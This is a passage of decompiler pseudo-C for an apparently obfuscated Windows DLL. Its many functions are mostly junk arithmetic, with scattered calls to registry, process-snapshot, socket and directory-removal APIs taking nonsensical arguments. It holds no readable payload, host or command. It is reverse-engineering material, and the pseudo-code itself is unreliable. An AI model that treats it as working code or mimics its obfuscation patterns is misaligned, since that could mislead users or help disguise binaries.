
{
  undefined1 *puVar1;
  undefined1 local_78 [80];
  
  FUN_18000bdb0();
  FUN_180015300();
  FUN_180054220();
  puVar1 = (undefined1 *)FUN_180028b98();
  if (puVar1 == (undefined1 *)0x0) {
    puVar1 = local_78;
  }
  return puVar1;
}


```

---

## Function: FUN_18004c200 (0x18004c200)

```c

/* WARNING: Removing unreachable block (ram,0x00018004c256) */
/* WARNING: Removing unreachable block (ram,0x00018004c282) */

longlong FUN_18004c200(void)

{
  undefined1 *puVar1;
  undefined1 *puVar2;
  
  puVar2 = &stack0xfffffffffffffff8;
  puVar1 = (undefined1 *)FUN_180043298();
  if (puVar1 == (undefined1 *)0x0) {
    puVar1 = puVar2;
  }
  return (longlong)puVar1 << 0x16;
}


```

---

## Function: FUN_18004c298 (0x18004c298)

```c

ulonglong FUN_18004c298(void)

{
  ulonglong uVar1;
  longlong unaff_RDI;
  int iVar2;
  ulonglong unaff_R12;
  
  iVar2 = 0;
  FUN_180026150();
  uVar1 = FUN_18004def0(-0x1fd310b6,&DAT_1800c2402,iVar2);
  if (-1 < unaff_RDI) {
    uVar1 = uVar1 ^ unaff_R12 >> 10;
  }
  return uVar1;
}


```

---

## Function: FUN_18004c350 (0x18004c350)

```c

/* WARNING: Removing unreachable block (ram,0x00018004c4d8) */

longlong FUN_18004c350(void)

{
  HKEY hKey;
  PHKEY in_stack_ffffffffffffff98;
  ulonglong local_48;
  
  hKey = (HKEY)&stack0xffffffffffffff98;
  RegOpenKeyExW(hKey,(LPCWSTR)s_usvLJxY_1800c070a,0,0x800c81da,in_stack_ffffffffffffff98);
  RemoveDirectoryA((LPCSTR)(((ulonglong)hKey >> 7) + 0x17));
  FUN_1800061d0();
  FUN_180014298();
  return (local_48 ^ 0x26abbd71) - 0xc;
}


```

---

## Function: FUN_18004c518 (0x18004c518)

```c

longlong FUN_18004c518(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  undefined *puVar3;
  ulonglong uVar4;
  ulonglong unaff_RSI;
  ulonglong uVar5;
  ulonglong local_78;
  ulonglong local_50;
  
  uVar2 = (unaff_RSI ^ 0x1800d48fa) & 0xffffffffffffffe2;
  uVar5 = (unaff_RSI ^ 0x1800d48fa) & uVar2;
  uVar1 = FUN_180019ac0();
  if (uVar1 != 0) {
    uVar5 = uVar5 << 0xd;
    uVar2 = uVar2 ^ local_78;
  }
  uVar5 = uVar5 & uVar2 * -0x100000 + 0xd;
  puVar3 = &DAT_1800c0977;
  FUN_18004d798();
  uVar5 = (longlong)uVar5 >> 0x1f;
  uVar2 = 0x2daf2fd8c000000;
  uVar1 = uVar2;
  if ((POPCOUNT((ulonglong)puVar3 & 0xff) & 1U) != 0) {
    uVar2 = ((local_50 & uVar5) >> 0x23 & 0xb6bcbf63) << 0x1a ^ uVar5;
    uVar1 = uVar5 & 0x2daf2fd8c000000;
  }
  uVar4 = 0;
  uVar5 = FUN_180053f00();
  if (uVar5 == 0) {
    uVar4 = uVar4 & (uVar1 ^ uVar2);
    uVar5 = uVar1;
  }
  return (uVar5 ^ uVar4) - 9;
}


```

---

## Function: FUN_18004c720 (0x18004c720)

```c

longlong FUN_18004c720(undefined8 param_1,undefined8 param_2,ulonglong param_3)

{
  longlong lVar1;
  ulonglong uVar2;
  ulonglong unaff_RBX;
  ulonglong in_R10;
  ulonglong unaff_R13;
  
  lVar1 = CreateToolhelp32Snapshot(&stack0xffffffffffffffd8,&stack0xffffffffffffffd8);
  if (lVar1 == 0) {
    unaff_R13 = (((unaff_R13 | in_R10) - (unaff_RBX >> 0xf)) + -7) * 2;
  }
  uVar2 = FUN_180037128();
  return uVar2 + (unaff_R13 >> 0x12) + 0x1d + (ulonglong)((unaff_R13 >> 0x11 & 1) != 0);
}


```

---

## Function: FUN_18004c7d8 (0x18004c7d8)

```c

longlong FUN_18004c7d8(void)

{
  longlong lVar1;
  
  lVar1 = NtQuerySystemInformation(0,0,0x23cccdd79216a0eb,0);
  return lVar1 + -5;
}


```

---

## Function: FUN_18004c840 (0x18004c840)

```c

undefined8 FUN_18004c840(void)

{
  RegCloseKey((HKEY)&stack0xfffffffffffffff0);
  return 0xb9bf8c44;
}


```

---

## Function: FUN_18004c8f0 (0x18004c8f0)

```c

undefined1 * FUN_18004c8f0(void)

{
  longlong in_RAX;
  ulonglong uVar1;
  undefined1 *puVar2;
  ulonglong uVar3;
  longlong unaff_RBX;
  longlong unaff_RSI;
  ulonglong in_R10;
  undefined1 local_28 [24];
  
  uVar3 = in_RAX + 0xc;
  uVar1 = FUN_18003dd00();
  puVar2 = (undefined1 *)(uVar1 ^ in_R10);
  in_R10 = in_R10 & (unaff_RBX + 5) * in_RAX + unaff_RSI;
  if (0 < (longlong)(in_R10 & uVar3)) {
    puVar2 = puVar2 + (longlong)(local_28 + in_R10);
  }
  return puVar2;
}


```

---

## Function: FUN_18004c980 (0x18004c980)

```c

longlong FUN_18004c980(void)

{
  LSTATUS LVar1;
  ulonglong in_RAX;
  ulonglong uVar2;
  undefined4 extraout_var;
  undefined *puVar3;
  LPCWSTR lpSubKey;
  ulonglong unaff_RBX;
  longlong lVar4;
  undefined1 *puVar5;
  ulonglong uVar6;
  HKEY hKey;
  HKEY pHVar7;
  REGSAM samDesired;
  longlong in_R10;
  ulonglong unaff_R12;
  ulonglong unaff_R13;
  ulonglong uVar8;
  longlong lVar9;
  PHKEY in_stack_ffffffffffffff88;
  undefined1 local_68 [32];
  ulonglong local_48;
  longlong local_40;
  
  samDesired = 0x800cdb42;
  puVar5 = local_68;
  uVar8 = (unaff_R13 & 0x775eb65c3519d306) - 0xb;
  uVar2 = (in_RAX ^ unaff_RBX) * uVar8;
  if ((in_R10 >> 0x14 & 0x775eb65c3519d308U) == 0) {
    unaff_R12 = unaff_R12 >> 6;
    puVar5 = (undefined1 *)(((ulonglong)&stack0xfffffffe7ff32456 ^ uVar8) - uVar2);
    unaff_RBX = unaff_RBX << 0x13;
  }
  uVar2 = uVar2 ^ unaff_RBX;
  lVar9 = 0;
  lVar4 = unaff_RBX * uVar2;
  uVar8 = lVar4 * 0x40000 + 0x15 + (ulonglong)(lVar4 * 0x20000 < 0);
  if ((longlong)uVar8 < 0) {
    unaff_R12 = unaff_R12 - (uVar2 + 0x775eb65c3519d2f6 >> 0x12 & unaff_R12);
  }
  uVar2 = 0;
  lVar4 = FUN_180016370();
  if (lVar4 == 0) {
    lVar9 = -0x11 - (unaff_R12 >> 0x20);
    uVar2 = uVar2 ^ unaff_R12 >> 0x20;
  }
  uVar6 = (longlong)(puVar5 + 0x16) * lVar9 ^ uVar8;
  uVar2 = lVar9 + (uVar2 >> 0x18);
  puVar3 = &DAT_1800c5535;
  hKey = (HKEY)0x0;
  FUN_1800205e8();
  lpSubKey = (LPCWSTR)(puVar3 + -0x14);
  pHVar7 = hKey;
  LVar1 = RegOpenKeyExW(hKey,lpSubKey,(DWORD)hKey,samDesired,in_stack_ffffffffffffff88);
  if (CONCAT44(extraout_var,LVar1) == 0) {
    uVar6 = uVar6 | (ulonglong)lpSubKey;
    hKey = (HKEY)(((ulonglong)hKey | uVar8) - (longlong)lpSubKey);
    lpSubKey = (LPCWSTR)(((ulonglong)lpSubKey ^ uVar2) - uVar2);
  }
  if (-1 < (longlong)hKey) {
    uVar2 = local_48 & (ulonglong)hKey ^ uVar6 + 0x1f;
    hKey = (HKEY)((ulonglong)hKey ^ uVar2);
    lpSubKey = (LPCWSTR)((ulonglong)lpSubKey >> 0x11 & uVar2);
  }
  FUN_18000d4a0((ulonglong)hKey >> 1,lpSubKey,(longlong)pHVar7);
  lVar4 = FUN_18003e1e0();
  if (lVar4 != 0) {
    lVar4 = lVar4 + local_40 + -1;
  }
  return lVar4;
}


```

---

## Function: FUN_18004cbc0 (0x18004cbc0)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_18004cbc0(undefined8 param_1,undefined8 param_2,ulonglong param_3)

{
  ulonglong uVar1;
  longlong lVar2;
  ulonglong unaff_RBX;
  ulonglong uVar3;
  longlong unaff_RSI;
  ulonglong uVar4;
  ulonglong *puVar5;
  ulonglong unaff_R12;
  ulonglong local_18;
  
  lVar2 = 0;
  uVar1 = FUN_180008438(0,(longlong)&local_18);
  puVar5 = &local_18;
  uVar3 = unaff_RBX ^ uVar1;
  uVar4 = unaff_RSI * (unaff_R12 ^ uVar1);
  if ((longlong)(param_3 & uVar1) < 1) {
    uVar4 = uVar4 | lVar2 - uVar4;
    param_3 = param_3 ^ uVar1;
    uVar3 = uVar3 ^ local_18;
  }
  if ((longlong)uVar3 < 1) {
    uVar1 = uVar1 + (longlong)puVar5;
    puVar5 = (ulonglong *)((longlong)puVar5 - uVar1);
  }
  return uVar1 + 0x12 + (ulonglong)CARRY8(uVar4 & param_3,(ulonglong)puVar5 >> 0x1d);
}


```

---

## Function: FUN_18004cc68 (0x18004cc68)

```c

ulonglong FUN_18004cc68(void)

{
  longlong in_RAX;
  ulonglong uVar1;
  longlong unaff_RBX;
  longlong lVar2;
  longlong unaff_RDI;
  longlong lVar3;
  ulonglong uVar4;
  longlong lVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  longlong lVar9;
  ulonglong unaff_R13;
  ulonglong local_80;
  
  lVar5 = 0;
  lVar3 = 0x1800cdb3d - (ulonglong)(in_RAX << 3 < 0);
  uVar7 = 0;
  uVar1 = FUN_1800503b8();
  if (uVar1 != 0) {
    uVar7 = uVar7 >> 7;
    local_80 = local_80 + 8 & 0xffffffffffffff80;
  }
  uVar8 = uVar7 + 5 + (ulonglong)((unaff_RBX * unaff_RDI >> 0x1c & 1U) != 0);
  uVar4 = lVar3 * 0x200000;
  uVar6 = lVar5 - 6;
  uVar7 = (unaff_RBX * unaff_RDI >> 0x1d) - 1;
  if ((uVar4 & uVar1) == 0) {
    uVar4 = uVar4 - unaff_R13;
    uVar8 = uVar8 >> 0x15;
    uVar6 = (lVar5 + -0xe) - unaff_RDI;
    uVar7 = uVar7 ^ uVar6;
  }
  lVar2 = (local_80 - 0xf) - (ulonglong)CARRY8(unaff_R13,uVar6);
  lVar9 = uVar8 + 0x1f;
  FUN_180056178();
  lVar5 = 0x45b51882cda9bc7b;
  lVar3 = FUN_18002cb40();
  if (lVar3 == 0) {
    uVar7 = uVar7 + lVar9;
    uVar4 = uVar4 & unaff_R13 + uVar6;
    lVar2 = lVar2 - uVar7;
  }
  uVar1 = (((unaff_R13 + uVar6) - 10) - (ulonglong)((lVar5 * uVar4 >> 7 & 1) != 0)) +
          (lVar5 * uVar4 >> 8);
  uVar4 = uVar7;
  FUN_180051bd8();
  lVar5 = uVar1 - uVar7;
  uVar1 = lVar2 * 8 + 2 + (ulonglong)(uVar1 < uVar7);
  uVar4 = uVar4 + 0x1d;
  lVar3 = FUN_1800503b8();
  if (lVar3 == 0) {
    lVar5 = lVar5 + uVar1;
    lVar3 = 0;
    uVar1 = uVar1 ^ uVar4;
  }
  uVar7 = lVar5 + 1 + lVar3;
  if ((uVar7 & (ulonglong)&stack0xfffffffffffffff8) != 0) {
    uVar1 = uVar1 ^ uVar7;
  }
  lVar3 = FUN_18002e160();
  return lVar3 + (uVar1 >> 0xe) >> 0x17;
}


```

---

## Function: FUN_18004cf00 (0x18004cf00)

```c

void FUN_18004cf00(void)

{
  FUN_1800434a8();
  return;
}


```

---

## Function: FUN_18004cf98 (0x18004cf98)

```c

void FUN_18004cf98(void)

{
  FUN_18004d808();
  return;
}


```

---

## Function: FUN_18004d010 (0x18004d010)

```c

/* WARNING: Removing unreachable block (ram,0x00018004d033) */

undefined1 * FUN_18004d010(void)

{
  undefined1 *puVar1;
  longlong lVar2;
  longlong lVar3;
  undefined1 auStack_44 [28];
  undefined1 local_28 [24];
  
  lVar3 = 0;
  lVar2 = 5;
  FUN_18000c818();
  puVar1 = local_28;
  if (lVar2 < 0) {
    puVar1 = puVar1 + lVar3 + -0x1c;
  }
  return puVar1;
}


```

---

## Function: FUN_18004d0d8 (0x18004d0d8)

```c

/* WARNING: Removing unreachable block (ram,0x00018004d129) */
/* WARNING: Removing unreachable block (ram,0x00018004d163) */

void FUN_18004d0d8(longlong param_1)

{
  undefined1 local_50 [40];
  
  WSAStartup(0x196d,(LPWSADATA)(&stack0xffffffffffffffd8 + ((ulonglong)local_50 | param_1 + 0x1dU)))
  ;
  return;
}


```

---

## Function: FUN_18004d208 (0x18004d208)

```c

ulonglong * FUN_18004d208(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  DWORD DVar1;
  ulonglong uVar2;
  undefined4 extraout_var;
  longlong lVar3;
  ulonglong *puVar4;
  ulonglong uVar5;
  undefined *puVar6;
  longlong unaff_RSI;
  ulonglong uVar7;
  ulonglong uVar8;
  LPSTR pCVar9;
  undefined *puVar10;
  ulonglong uVar11;
  LPSTR lpBuffer;
  LPSTR *lpFilePart;
  longlong in_R10;
  ulonglong uVar12;
  LPCSTR lpFileName;
  ulonglong in_R11;
  CHAR aCStack_179 [33];
  ulonglong local_158;
  undefined1 auStack_150 [96];
  undefined8 uStack_f0;
  undefined1 local_a8 [120];
  
  uVar12 = in_R10 - 4;
  uVar7 = unaff_RSI * param_3;
  uVar5 = 0;
  puVar10 = &DAT_1800c0712;
  lpFilePart = (LPSTR *)&DAT_1800c2759;
  uStack_f0 = 0x18004d266;
  uVar2 = FUN_180044118();
  uVar8 = uVar12 & 0x7163ad6d;
  if ((longlong)(uVar12 & uVar5) < 0) {
    puVar10 = puVar10 + -0x1f;
    uVar5 = uVar5 + uVar7;
    uVar7 = uVar7 + 6;
    uVar8 = uVar8 + uVar7;
  }
  puVar6 = (undefined *)(uVar5 - (longlong)puVar10);
  uVar5 = (uVar2 | (ulonglong)puVar10) >> 0x1c;
  uVar11 = (longlong)(puVar10 + (ulonglong)(((uVar2 | (ulonglong)puVar10) >> 0x1b & 1) != 0) + 8) -
           (longlong)puVar6 >> 0x1a;
  if (-1 < (longlong)puVar6) {
    uVar11 = uVar11 + 0x1d;
    uVar8 = (uVar8 ^ uVar11) & uVar5;
  }
  lpFileName = (LPCSTR)(uVar12 + 0x10 +
                        (ulonglong)
                        (puVar10 + (ulonglong)(((uVar2 | (ulonglong)puVar10) >> 0x1b & 1) != 0) + 8
                        < puVar6) | uVar8);
  lpBuffer = (LPSTR)(uVar11 | (ulonglong)lpFileName);
  pCVar9 = (LPSTR)0x0;
  if (-1 < (longlong)uVar7) {
    lpFileName = (LPCSTR)((ulonglong)(lpFileName + -0x3f5b6b17) & 0x3f5b6b17);
    pCVar9 = (LPSTR)0x4;
    lpBuffer = (LPSTR)(((ulonglong)lpBuffer | 0x3f5b6b17) + 7);
    uVar7 = uVar7 & uVar5 | 0x3f5b6b17;
  }
  if (uVar7 == 0) {
    lpBuffer = lpBuffer + -(longlong)lpFileName;
  }
  uStack_f0 = 0x18004d326;
  DVar1 = GetFullPathNameA(lpFileName,0xe9eda1b6,lpBuffer,lpFilePart);
  if (CONCAT44(extraout_var,DVar1) != 0) {
    lpFileName = (LPCSTR)(((ulonglong)lpFileName >> 0xb) - uVar7);
    pCVar9 = lpBuffer;
  }
  if (local_158 != 0) {
    pCVar9 = (LPSTR)((longlong)pCVar9 << 0x15);
    lpFileName = (LPCSTR)((ulonglong)lpFileName & uVar7 & (local_158 | (ulonglong)lpBuffer));
    uVar7 = uVar7 - (longlong)lpBuffer;
  }
  pCVar9 = pCVar9 + 0x18;
  uVar2 = (ulonglong)lpFileName & uVar7;
  uStack_f0 = 0x18004d397;
  lVar3 = FUN_180051bd8();
  if (lVar3 == 0) {
    pCVar9 = (LPSTR)((ulonglong)(pCVar9 + uVar7) | uVar2);
  }
  uVar2 = (uVar7 - 8 | in_R11 | (ulonglong)(pCVar9 + -0x179 + (longlong)&stack0x00000000)) + 0x1b;
  puVar4 = (ulonglong *)(((ulonglong)(local_a8 + (longlong)local_a8) & uVar2) + 0x2c);
  if (((longlong)uVar2 >> 2 & (ulonglong)(local_a8 + (uVar2 ^ 0x4e0a47311))) != 0) {
    puVar4 = &local_158;
  }
  return puVar4;
}


```

---

## Function: FUN_18004d478 (0x18004d478)

```c

longlong FUN_18004d478(void)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  longlong unaff_RBX;
  longlong unaff_RSI;
  longlong unaff_RDI;
  undefined *puVar2;
  longlong in_R11;
  longlong lVar3;
  ulonglong uVar4;
  
  lVar3 = (in_R11 + -0x18) -
          (ulonglong)(SEXT816(unaff_RDI * unaff_RBX) != SEXT816(unaff_RDI) * SEXT816(unaff_RBX));
  if ((POPCOUNT(in_RAX & 0xff) & 1U) == 0) {
    lVar3 = (lVar3 - unaff_RSI) + 0xf;
  }
  uVar4 = lVar3 << 0x11;
  puVar2 = &DAT_1800cadc5;
  uVar1 = FUN_180042ca0();
  if ((longlong)uVar1 < 0) {
    puVar2 = (undefined *)((ulonglong)puVar2 >> 0x18);
    uVar1 = uVar1 & uVar4;
  }
  return uVar1 * (((longlong)puVar2 - uVar1 & uVar4) - 2);
}


```

---

## Function: FUN_18004d580 (0x18004d580)

```c

/* WARNING: Removing unreachable block (ram,0x00018004d659) */

void FUN_18004d580(void)

{
  undefined1 local_20 [8];
  
  GetCurrentDirectoryW((DWORD)local_20,(LPWSTR)0x0);
  RemoveDirectoryA((LPCSTR)0x7ae3a8211174676);
  FUN_18002f9a8();
  return;
}


```

---

## Function: FUN_18004d710 (0x18004d710)

```c

longlong FUN_18004d710(void)

{
  longlong lVar1;
  undefined1 *puVar2;
  ulonglong unaff_RSI;
  ulonglong uVar3;
  ulonglong unaff_RDI;
  undefined1 *puVar4;
  ulonglong uVar5;
  ulonglong in_R10;
  ulonglong uVar6;
  undefined1 local_28 [24];
  
  puVar2 = local_28;
  uVar5 = 0;
  uVar6 = in_R10 & unaff_RDI;
  puVar4 = puVar2;
  lVar1 = FUN_1800346d0();
  if (lVar1 != 0) {
    uVar3 = unaff_RSI ^ (ulonglong)puVar2;
    puVar2 = (undefined1 *)((ulonglong)puVar2 & ((ulonglong)puVar4 | uVar5));
    unaff_RSI = uVar3 | (ulonglong)puVar2;
  }
  return unaff_RSI -
         ((longlong)puVar2 -
         ((((longlong)uVar6 >> 7) + -0x1c) - (ulonglong)(((longlong)uVar6 >> 6 & 1U) != 0)));
}


```

---

## Function: FUN_18004d798 (0x18004d798)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_18004d798(void)

{
  return;
}


```

---

## Function: FUN_18004d808 (0x18004d808)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_18004d808(void)

{
  undefined8 *puVar1;
  ulonglong uVar2;
  undefined1 *puVar3;
  longlong in_R9;
  longlong in_R10;
  ulonglong in_R11;
  longlong unaff_R12;
  undefined1 local_38 [8];
  undefined1 local_30 [24];
  
  puVar3 = local_30;
  uVar2 = 0;
  puVar1 = FUN_180053370();
  if ((longlong)uVar2 < 0) {
    uVar2 = uVar2 | in_R11;
    unaff_R12 = (unaff_R12 + in_R9) - in_R11;
  }
  return (longlong)((longlong)puVar1 + (longlong)puVar3) - (unaff_R12 - uVar2 * in_R10) ^
         (ulonglong)local_38;
}


```

---

## Function: FUN_18004d898 (0x18004d898)

```c

longlong FUN_18004d898(void)

{
  longlong lVar1;
  longlong local_20;
  
  FUN_18002cbf0();
  lVar1 = FUN_18003b008();
  if (lVar1 == 0) {
    lVar1 = local_20;
  }
  return lVar1;
}


```

---

## Function: FUN_18004d968 (0x18004d968)

```c

longlong FUN_18004d968(void)

{
  NTSTATUS NVar1;
  undefined4 extraout_var;
  ulonglong uVar3;
  PUCHAR unaff_RDI;
  undefined1 *puVar4;
  undefined1 local_18 [8];
  undefined1 local_10 [8];
  ulonglong uVar2;
  
  puVar4 = local_18;
  uVar3 = 0xba2748a8a8e22f73;
  NVar1 = BCryptGenRandom((BCRYPT_ALG_HANDLE)0xba2748a8a8e22f73,unaff_RDI,(ULONG)local_10,
                          (ULONG)puVar4);
  uVar2 = CONCAT44(extraout_var,NVar1);
  if (uVar2 != 0) {
    puVar4 = (undefined1 *)((ulonglong)puVar4 & uVar2);
  }
  return (uVar2 >> 5) + ((ulonglong)(puVar4 + (((ulonglong)unaff_RDI ^ uVar3) >> 7)) ^ uVar2 >> 5);
}


```

---

## Function: FUN_18004da28 (0x18004da28)

```c

longlong FUN_18004da28(void)

{
  void *pvVar1;
  longlong lVar2;
  undefined8 uVar3;
  ulonglong *_NewSize;
  ulonglong uVar4;
  undefined1 *puVar5;
  ulonglong local_20;
  undefined1 local_18 [16];
  
  _NewSize = &local_20;
  puVar5 = local_18;
  uVar4 = local_20 >> 7;
  uVar3 = 0;
  pvVar1 = realloc((void *)0x0,(size_t)_NewSize);
  if (pvVar1 == (void *)0x0) {
    _NewSize = (ulonglong *)((ulonglong)((longlong)_NewSize + (longlong)puVar5) & uVar4);
  }
  FUN_180042a18(uVar3,_NewSize,(int)uVar4);
  lVar2 = FUN_1800550d8();
  return lVar2 + 0x19 + (ulonglong)(((longlong)uVar4 >> 0x10 & 1U) != 0);
}


```

---

## Function: FUN_18004db58 (0x18004db58)

```c

undefined8 FUN_18004db58(void)

{
  return 0x976d73dd9076ecea;
}


```

---

## Function: FUN_18004dc08 (0x18004dc08)

```c

longlong * FUN_18004dc08(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  longlong *plVar3;
  undefined1 *puVar4;
  ulonglong unaff_RBX;
  ulonglong uVar5;
  ulonglong unaff_RSI;
  undefined *puVar6;
  ulonglong in_R10;
  ulonglong uVar7;
  ulonglong in_R11;
  ulonglong uVar8;
  longlong local_60 [3];
  undefined1 auStack_42 [18];
  ulonglong local_30 [2];
  
  puVar6 = &DAT_1800c3ddb;
  BVar1 = RemoveDirectoryA(&DAT_1800d1206);
  uVar2 = 0;
  if (CONCAT44(extraout_var,BVar1) != 0) {
    unaff_RBX = unaff_RBX - unaff_RSI ^ unaff_RSI;
    in_R11 = in_R11 ^ unaff_RBX;
    puVar6 = puVar6 + in_R10;
    uVar2 = ((CONCAT44(extraout_var,BVar1) | in_R10) ^ unaff_RSI) + in_R11;
  }
  in_R10 = in_R10 << 0xf;
  uVar8 = (((in_R11 - 3) - (ulonglong)(uVar2 < 0xd)) * ((longlong)puVar6 >> 5) ^ (ulonglong)local_30
          ) * local_60[0];
  uVar5 = unaff_RBX + 8 ^ local_30[0];
  puVar4 = auStack_42;
  uVar7 = in_R10;
  uVar2 = FUN_18003c450();
  if (uVar2 == 0) {
    uVar7 = uVar7 - 0x12;
    puVar4 = (undefined1 *)(((ulonglong)puVar4 | uVar5) + in_R10);
    uVar5 = uVar5 ^ uVar8;
    uVar2 = in_R10;
  }
  uVar2 = (longlong)(uVar2 << 0xe) >> 0x13;
  if (-1 < (longlong)uVar5) {
    uVar2 = uVar2 + in_R10 >> 0x17;
    uVar8 = uVar8 ^ (ulonglong)puVar4;
    in_R10 = in_R10 | uVar5;
    uVar5 = uVar5 - 0x13;
  }
  uVar7 = uVar7 + 0xb & uVar8;
  uVar2 = uVar5 + 8 + (ulonglong)((undefined1 *)0xfffffffffffffff5 < puVar4) | uVar2 - uVar7;
  plVar3 = local_60;
  if ((longlong)(uVar2 | ((in_R10 & 0xc468c132) + 0x16 | uVar2) & uVar8 * 2) < 1) {
    plVar3 = (longlong *)((ulonglong)plVar3 | uVar7 * 0xc468c121 - 0x1d);
  }
  return plVar3;
}


```

---

## Function: FUN_18004ddc0 (0x18004ddc0)

```c

longlong FUN_18004ddc0(void)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  ulonglong uVar2;
  undefined1 *puVar3;
  ulonglong in_R10;
  ulonglong uVar4;
  
  puVar3 = &stack0xfffffffffffffff8;
  uVar4 = in_R10 | in_RAX;
  uVar1 = FUN_180055ff8();
  uVar2 = 0;
  if (uVar1 != 0) {
    uVar2 = uVar1 & uVar4;
  }
  return uVar2 * (longlong)puVar3;
}


```

---

## Function: FUN_18004de60 (0x18004de60)

```c

void FUN_18004de60(longlong param_1,longlong param_2)

{
  ulonglong uVar1;
  longlong unaff_RSI;
  ulonglong in_R11;
  
  uVar1 = param_1 + 0x1e;
  CreateToolhelp32Snapshot
            (uVar1,param_2 + 0x18 + (ulonglong)(0xffffffffffffffe6 < unaff_RSI - uVar1),
             uVar1 | in_R11,0);
  return;
}


```

---

## Function: FUN_18004def0 (0x18004def0)

```c

void FUN_18004def0(int param_1,undefined8 param_2,int param_3)

{
  int *unaff_RSI;
  sockaddr *in_stack_ffffffffffffffe8;
  
  recvfrom(0x550f8797,(char *)0x0,param_3,param_1 + -0x7ff3d883,in_stack_ffffffffffffffe8,unaff_RSI)
  ;
  return;
}


```

---

## Function: FUN_18004df88 (0x18004df88)

```c

void FUN_18004df88(void)

{
  longlong in_R9;
  
  RemoveDirectoryA((LPCSTR)((in_R9 + 0x1bU & 0xbcb3713ce37ff734) >> 0xf));
  return;
}


```

---

## Function: FUN_18004e030 (0x18004e030)

```c

/* WARNING: Removing unreachable block (ram,0x00018004e0b9) */

void FUN_18004e030(void)

{
  FUN_1800342b0();
  return;
}


```

---

## Function: FUN_18004e0e8 (0x18004e0e8)

```c

longlong FUN_18004e0e8(void)

{
  longlong lVar1;
  longlong lVar2;
  
  lVar2 = -0x53ecbfcb98672ccd;
  lVar1 = FUN_18001c208();
  if (lVar1 == 0) {
    lVar1 = lVar2 + 1;
  }
  return lVar1;
}


```

---

## Function: FUN_18004e1f0 (0x18004e1f0)

```c

void FUN_18004e1f0(void)

{
  FUN_180045260();
  return;
}


```

---

## Function: FUN_18004e298 (0x18004e298)

```c

longlong FUN_18004e298(void)

{
  longlong lVar1;
  longlong unaff_RDI;
  
  lVar1 = FUN_18002fa18();
  return (lVar1 - unaff_RDI) + 1;
}


```

---

## Function: FUN_18004e340 (0x18004e340)

```c

undefined8 FUN_18004e340(void)

{
  return 0xb107965ad5466d3b;
}


```

---

## Function: FUN_18004e3b8 (0x18004e3b8)

```c

void FUN_18004e3b8(void)

{
  return;
}


```

---

## Function: FUN_18004e438 (0x18004e438)

```c

void FUN_18004e438(void)

{
  RemoveDirectoryA((LPCSTR)0x0);
  FUN_18002e958();
  RemoveDirectoryA((LPCSTR)0x416bbb9c3c252141);
  return;
}


```

---

## Function: FUN_18004e618 (0x18004e618)

```c

void FUN_18004e618(void)

{
  FUN_180044bf0();
  FUN_1800352a8();
  FUN_18000cf80();
  return;
}


```

---

## Function: FUN_18004e860 (0x18004e860)

```c

undefined8 FUN_18004e860(void)

{
  longlong unaff_RBX;
  undefined8 in_R11;
  
  FUN_180048ab0(0x60f77a7c136671b5,in_R11,unaff_RBX);
  return 0xed854e9e348f76b2;
}


```

---

## Function: FUN_18004e988 (0x18004e988)

```c

/* WARNING: Removing unreachable block (ram,0x00018004e9d8) */
/* WARNING: Removing unreachable block (ram,0x00018004eaa5) */

void FUN_18004e988(void)

{
  FUN_18003f878();
  FUN_180014108();
  return;
}


```

---

## Function: FUN_18004eb08 (0x18004eb08)

```c

undefined8 FUN_18004eb08(void)

{
  return 0xa9adf702;
}


```

---

## Function: FUN_18004ebd8 (0x18004ebd8)

```c

longlong FUN_18004ebd8(void)

{
  BOOL BVar1;
  longlong lVar2;
  undefined4 extraout_var;
  ulonglong unaff_RSI;
  longlong in_R11;
  
  lVar2 = FUN_180023938();
  if (lVar2 == 0) {
    unaff_RSI = unaff_RSI | in_R11 - 0x15U;
  }
  RemoveDirectoryA((LPCSTR)0xa);
  BVar1 = RemoveDirectoryA((LPCSTR)0x0);
  lVar2 = CONCAT44(extraout_var,BVar1);
  if (lVar2 == 0) {
    lVar2 = unaff_RSI << 10;
  }
  return lVar2 + 0x1f;
}


```

---

## Function: FUN_18004ecd0 (0x18004ecd0)

```c

void FUN_18004ecd0(void)

{
  FUN_180004d78();
  return;
}


```

---

## Function: FUN_18004ed78 (0x18004ed78)

```c

longlong FUN_18004ed78(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  undefined1 local_30 [16];
  
  uVar2 = 0x54736acc357f1e6b;
  uVar1 = FUN_1800141b8(0x54736acc357f1e6b,0);
  return ((ulonglong)local_30 & (uVar2 ^ uVar1)) + 0xb;
}


```

---

## Function: FUN_18004ee18 (0x18004ee18)

```c

longlong FUN_18004ee18(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  longlong lVar2;
  longlong unaff_RSI;
  ulonglong unaff_RDI;
  longlong unaff_R13;
  
  BVar1 = RemoveDirectoryA(&stack0xffffffffffffffe0);
  lVar2 = CONCAT44(extraout_var,BVar1);
  if (lVar2 == 0) {
    lVar2 = -(unaff_R13 + unaff_RSI | unaff_RDI);
  }
  return lVar2;
}


```

---

## Function: FUN_18004eec0 (0x18004eec0)

```c

longlong FUN_18004eec0(void)

{
  longlong lVar1;
  ulonglong uVar2;
  undefined1 *puVar3;
  longlong unaff_RBX;
  ulonglong uVar4;
  undefined1 *puVar5;
  longlong in_R10;
  longlong in_R11;
  ulonglong uVar6;
  undefined1 local_res8 [32];
  longlong local_18;
  
  uVar6 = in_R11 + 0xf;
  puVar3 = &stack0xfffffffffffffffd;
  uVar4 = 0;
  puVar5 = local_res8;
  lVar1 = FUN_180055ed8();
  uVar2 = 0;
  if (lVar1 != 0) {
    uVar6 = (uVar6 & in_R10 - 0x19U) + uVar4 + lVar1;
    uVar4 = uVar4 + lVar1 & (ulonglong)puVar5 >> 0x1f;
    uVar2 = lVar1 - unaff_RBX | (ulonglong)(puVar3 + (longlong)&local_18);
  }
  return (uVar2 * (uVar4 - 2) + -0x1a) -
         (ulonglong)
         (0xffffffffffffffee < uVar6 ||
         CARRY8(uVar6 + 0x11,(ulonglong)((local_18 + 0x1d >> 6 & 1U) != 0)));
}


```

---

